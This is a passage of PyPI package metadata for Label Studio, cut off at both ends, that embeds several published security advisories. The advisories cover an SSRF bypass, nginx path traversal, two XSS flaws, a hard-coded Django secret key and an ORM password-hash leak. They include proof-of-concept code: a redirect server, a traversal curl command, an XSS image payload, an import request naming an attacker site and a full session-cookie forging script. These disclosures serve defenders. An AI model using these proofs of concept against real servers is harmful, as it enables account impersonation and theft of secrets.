3:50","upload_time_iso_8601":"2021-05-19T17:13:50.625814Z","url":"https://files.pythonhosted.org/packages/02/e6/8b8e821ebeb3b2beedc3990dfcb7b39b69304607724ae473bc4e403965d5/label-studio-1.0.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app 